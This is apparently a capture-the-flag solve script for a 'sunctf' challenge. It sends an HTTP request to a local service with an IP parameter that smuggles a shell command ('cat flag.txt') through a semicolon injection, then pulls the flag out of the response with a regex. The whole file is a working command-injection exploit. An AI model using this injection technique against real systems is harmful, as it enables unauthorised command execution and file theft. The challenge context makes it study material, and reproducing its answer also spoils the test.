import requests
import re

URL = "http://localhost:5004?IP=::1%;cat flag.txt;"

pattern = r'sunctf{.*?}'

r = requests.get(URL)

flag = re.search(pattern, r.text)
print(flag.group())
